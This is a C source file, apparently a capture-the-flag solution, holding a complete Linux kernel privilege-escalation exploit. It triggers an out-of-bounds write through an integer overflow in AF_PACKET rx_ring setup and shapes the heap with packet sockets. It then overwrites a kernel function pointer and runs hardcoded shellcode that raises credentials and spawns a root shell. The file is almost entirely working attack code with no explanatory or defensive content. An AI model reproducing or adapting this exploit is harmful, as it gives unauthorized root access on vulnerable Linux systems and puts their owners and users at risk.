//Second Blood
//gcc ./W2L.c -o exp --static
#define _GNU_SOURCE

#include <errno.h>
#include <fcntl.h>
#include <stdarg.h>
#include <stdbool.h>
#include <stddef.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sched.h>

#include <sys/ioctl.h>
#include <sys/klog.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/wait.h>

#include <arpa/inet.h>
#include <linux/if_packet.h>
#include <linux/ip.h>
#include <linux/udp.h>
#include <netinet/if_ether.h>
#include <net/if.h>





#define MAGIC_SHELLCODE	0x100000ul


#define KMALLOC_PAD		512
#define PAGEALLOC_PAD		1024

// * * * * * * * * * * * * * * Kernel structs * * * * * * * * * * * * * * * *

typedef uint32_t u32;

// $ pahole -C hlist_node ./vmlinux
struct hlist_node {
	struct hlist_node *        next;                 /*     0     8 */
	struct hlist_node * *      pprev;                /*     8     8 */
};

// $ pahole -C timer_list ./vmlinux
struct timer_list {
	struct hlist_node          entry;                /*     0    16 */
	long unsigned int          expires;              /*    16     8 */
	void                       (*function)(long unsigned int); /*    24     8 */
	long unsigned int          data;                 /*    32     8 */
	u32                        flags;                /*    40     4 */
	int                        start_pid;            /*    44     4 */
	void *                     start_site;           /*    48     8 */
	char                       start_comm[16];       /*    56    16 */
};

// packet_sock->rx_ring->prb_bdqc->retire_blk_timer
#define TIMER_OFFSET	896

// pakcet_sock->xmit
#define XMIT_OFFSET	1304

// * * * * * * * * * * * * * * * Helpers * * * * * * * * * * * * * * * * * *

void packet_socket_rx_ring_init(int s, unsigned int block_size,
		unsigned int frame_size, unsigned int block_nr,
		unsigned int sizeof_priv, unsigned int timeout) {
	int v = TPACKET_V3;
	int rv = setsockopt(s, SOL_PACKET, PACKET_VERSION, &v, sizeof(v));
	if (rv < 0) {
		perror("[-] setsockopt(PACKET_VERSION)");
		exit(EXIT_FAILURE);
	}

	struct tpacket_req3 req;
	memset(&req, 0, sizeof(req));
	req.tp_block_size = block_size;
	req.tp_frame_size = frame_size;
	req.tp_block_nr = block_nr;
	req.tp_frame_nr = (block_size * block_nr) / frame_size;
	req.tp_retire_blk_tov = timeout;
	req.tp_sizeof_priv = sizeof_priv;
	req.tp_feature_req_word = 0;

	rv = setsockopt(s, SOL_PACKET, PACKET_RX_RING, &req, sizeof(req));
	if (rv < 0) {
		perror("[-] setsockopt(PACKET_RX_RING)");
		exit(EXIT_FAILURE);
	}
}

int packet_socket_setup(unsigned int block_size, unsigned int frame_size,
		unsigned int block_nr, unsigned int sizeof_priv, int timeout) {
	int s = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
	if (s < 0) {
		perror("[-] socket(AF_PACKET)");
		exit(EXIT_FAILURE);
	}

	packet_socket_rx_ring_init(s, block_size, frame_size, block_nr,
		sizeof_priv, timeout);

	struct sockaddr_ll sa;
	memset(&sa, 0, sizeof(sa));
	sa.sll_family = PF_PACKET;
	sa.sll_protocol = htons(ETH_P_ALL);
	sa.sll_ifindex = if_nametoindex("lo");
	sa.sll_hatype = 0;
	sa.sll_pkttype = 0;
	sa.sll_halen = 0;

	int rv = bind(s, (struct sockaddr *)&sa, sizeof(sa));
	if (rv < 0) {
		perror("[-] bind(AF_PACKET)");
		exit(EXIT_FAILURE);
	}

	return s;
}

void packet_socket_send(int s, char *buffer, int size) {
	struct sockaddr_ll sa;
	memset(&sa, 0, sizeof(sa));
	sa.sll_ifindex = if_nametoindex("lo");
	sa.sll_halen = ETH_ALEN;

	if (sendto(s, buffer, size, 0, (struct sockaddr *)&sa,
			sizeof(sa)) < 0) {
		perror("[-] sendto(SOCK_RAW)");
		exit(EXIT_FAILURE);
	}
}

void loopback_send(char *buffer, int size) {
	int s = socket(AF_PACKET, SOCK_RAW, IPPROTO_RAW);
	if (s == -1) {
		perror("[-] socket(SOCK_RAW)");
		exit(EXIT_FAILURE);
	}

	packet_socket_send(s, buffer, size);
}

int packet_sock_kmalloc() {
	int s = socket(AF_PACKET, SOCK_DGRAM, htons(ETH_P_ARP));
	if (s == -1) {
		perror("[-] socket(SOCK_DGRAM)");
		exit(EXIT_FAILURE);
	}
	return s;
}

void packet_sock_timer_schedule(int s, int timeout) {
	packet_socket_rx_ring_init(s, 0x1000, 0x1000, 1, 0, timeout);
}

void packet_sock_id_match_trigger(int s) {
	char buffer[16];
	packet_socket_send(s, &buffer[0], sizeof(buffer));
}

// * * * * * * * * * * * * * * * Trigger * * * * * * * * * * * * * * * * * *

#define ALIGN(x, a)			__ALIGN_KERNEL((x), (a))
#define __ALIGN_KERNEL(x, a)		__ALIGN_KERNEL_MASK(x, (typeof(x))(a) - 1)
#define __ALIGN_KERNEL_MASK(x, mask)	(((x) + (mask)) & ~(mask))

#define V3_ALIGNMENT	(8)
#define BLK_HDR_LEN	(ALIGN(sizeof(struct tpacket_block_desc), V3_ALIGNMENT))

#define ETH_HDR_LEN	sizeof(struct ethhdr)
#define IP_HDR_LEN	sizeof(struct iphdr)
#define UDP_HDR_LEN	sizeof(struct udphdr)

#define UDP_HDR_LEN_FULL	(ETH_HDR_LEN + IP_HDR_LEN + UDP_HDR_LEN)

int oob_setup(int offset) {
	unsigned int maclen = ETH_HDR_LEN;
	unsigned int netoff = TPACKET_ALIGN(TPACKET3_HDRLEN +
				(maclen < 16 ? 16 : maclen));
	unsigned int macoff = netoff - maclen;
	unsigned int sizeof_priv = (1u<<31) + (1u<<30) +
		0x8000 - BLK_HDR_LEN - macoff + offset;
	return packet_socket_setup(0x8000, 2048, 2, sizeof_priv, 100);
}

void oob_write(char *buffer, int size) {
	loopback_send(buffer, size);
}

void oob_timer_execute(void *func, unsigned long arg) {
	oob_setup(2048 + TIMER_OFFSET - 8);

	int i;
	for (i = 0; i < 32; i++) {
		int timer = packet_sock_kmalloc();
		packet_sock_timer_schedule(timer, 1000);
	}

	char buffer[2048];
	memset(&buffer[0], 0, sizeof(buffer));

	struct timer_list *timer = (struct timer_list *)&buffer[8];
	timer->function = func;
	timer->data = arg;
	timer->flags = 1;

	oob_write(&buffer[0] + 2, sizeof(*timer) + 8 - 2);

	sleep(1);
}

void oob_id_match_execute(void *func) {
	int s = oob_setup(2048 + XMIT_OFFSET - 64);

	int ps[32];

	int i;
	for (i = 0; i < 32; i++)
		ps[i] = packet_sock_kmalloc();

	char buffer[2048];
	memset(&buffer[0], 0, 2048);

	void **xmit = (void **)&buffer[64];
	*xmit = func;

	oob_write((char *)&buffer[0] + 2, sizeof(*xmit) + 64 - 2);

	for (i = 0; i < 32; i++)
		packet_sock_id_match_trigger(ps[i]);
}

// * * * * * * * * * * * * * * Heap shaping * * * * * * * * * * * * * * * * *

void kmalloc_pad(int count) {
	int i;
	for (i = 0; i < count; i++)
		packet_sock_kmalloc();
}

void pagealloc_pad(int count) {
	packet_socket_setup(0x8000, 2048, count, 0, 100);
}

// * * * * * * * * * * * * * * * Getting root * * * * * * * * * * * * * * * *


typedef unsigned long __attribute__((regparm(3))) (* magic_func)(unsigned long code);

void get_root_payload(void) {
			((magic_func)(MAGIC_SHELLCODE))(0);
}


// * * * * * * * * * * * * * * * * * Main * * * * * * * * * * * * * * * * * *

void exec_shell() {
	char *shell = "/bin/bash";
	char *args[] = {shell, "-i", NULL};
	execve(shell, args, NULL);
}

void fork_shell() {
	pid_t rv;

	rv = fork();
	if (rv == -1) {
		perror("[-] fork()");
		exit(EXIT_FAILURE);
	}

	if (rv == 0) {
		exec_shell();
	}
}



bool write_file(const char* file, const char* what, ...) {
	char buf[1024];
	va_list args;
	va_start(args, what);
	vsnprintf(buf, sizeof(buf), what, args);
	va_end(args);
	buf[sizeof(buf) - 1] = 0;
	int len = strlen(buf);

	int fd = open(file, O_WRONLY | O_CLOEXEC);
	if (fd == -1)
		return false;
	if (write(fd, buf, len) != len) {
		close(fd);
		return false;
	}
	close(fd);
	return true;
}

void setup_sandbox() {
	int real_uid = getuid();
	int real_gid = getgid();

        if (unshare(CLONE_NEWUSER) != 0) {
		perror("[-] unshare(CLONE_NEWUSER)");
		exit(EXIT_FAILURE);
	}

        if (unshare(CLONE_NEWNET) != 0) {
		perror("[-] unshare(CLONE_NEWUSER)");
		exit(EXIT_FAILURE);
	}

	if (!write_file("/proc/self/setgroups", "deny")) {
		perror("[-] write_file(/proc/self/set_groups)");
		exit(EXIT_FAILURE);
	}
	if (!write_file("/proc/self/uid_map", "0 %d 1\n", real_uid)){
		perror("[-] write_file(/proc/self/uid_map)");
		exit(EXIT_FAILURE);
	}
	if (!write_file("/proc/self/gid_map", "0 %d 1\n", real_gid)) {
		perror("[-] write_file(/proc/self/gid_map)");
		exit(EXIT_FAILURE);
	}

	cpu_set_t my_set;
	CPU_ZERO(&my_set);
	CPU_SET(0, &my_set);
	if (sched_setaffinity(0, sizeof(my_set), &my_set) != 0) {
		perror("[-] sched_setaffinity()");
		exit(EXIT_FAILURE);
	}

	if (system("/sbin/ifconfig lo up") != 0) {
		perror("[-] system(/sbin/ifconfig lo up)");
		exit(EXIT_FAILURE);
	}
}

unsigned long user_cs, user_ss, user_eflags,user_sp	;
void save_status() {
	asm(
		"movq %%cs, %0\n"
		"movq %%ss, %1\n"
		"movq %%rsp, %3\n"
		"pushfq\n"
		"popq %2\n"
		:"=r"(user_cs), "=r"(user_ss), "=r"(user_eflags),"=r"(user_sp)
 		:
 		: "memory"
 	);
}

int main() {
    save_status();
	signal(SIGSEGV, exec_shell);
	printf("%p %p %p %p\n",user_sp,user_eflags,user_ss,user_cs);
	long int fake=mmap(0x100000, 0x1000, PROT_READ | PROT_WRITE | PROT_EXEC,MAP_ANONYMOUS | MAP_PRIVATE | MAP_FIXED,0,0);
	char magic[]={0x48,0x89,0xe0,0x48,0x83,0xc0,0x10,0x48,0x8b,0x18,0x48,0x81,0xeb,0x69,0xdf,0xa0,0x0,0x49,0x89,0xd9,0x49,0x81,0xc1,0xe0,0xd1,0x8,0x0,0x41,0xff,0xd1,0x48,0x89,0xc7,0x49,0x89,0xd9,0x49,0x81,0xc1,0xb0,0xcd,0x8,0x0,0x41,0xff,0xd1,0xf,0x1,0xf8,0x6a,0x2b,0x68,0x0,0x5,0x10,0x0,0x68,0x46,0x2,0x0,0x0,0x6a,0x33,0x68,0x0,0x0,0x20,0x0,0x48,0xcf};
	long int fake2=mmap(0x200000, 0x1000, PROT_READ | PROT_WRITE | PROT_EXEC,MAP_ANONYMOUS | MAP_PRIVATE | MAP_FIXED,0,0);
	char magic2[]={0x6a,0x68,0x48,0xb8,0x2f,0x62,0x69,0x6e,0x2f,0x2f,0x2f,0x73,0x50,0x48,0x89,0xe7,0x68,0x72,0x69,0x1,0x1,0x81,0x34,0x24,0x1,0x1,0x1,0x1,0x31,0xf6,0x56,0x6a,0x8,0x5e,0x48,0x1,0xe6,0x56,0x48,0x89,0xe6,0x31,0xd2,0x6a,0x3b,0x58,0xf,0x5};
	memcpy(fake,magic,sizeof(magic));
	memcpy(fake2,magic2,sizeof(magic2));
	printf("[.] mmap at %p\n",fake);

	printf("[.] Setup \n");
	setup_sandbox();


	kmalloc_pad(KMALLOC_PAD);
	pagealloc_pad(PAGEALLOC_PAD);
	printf("[.] Exploit \n");
	oob_id_match_execute((void *)&get_root_payload);

	return 0;
}


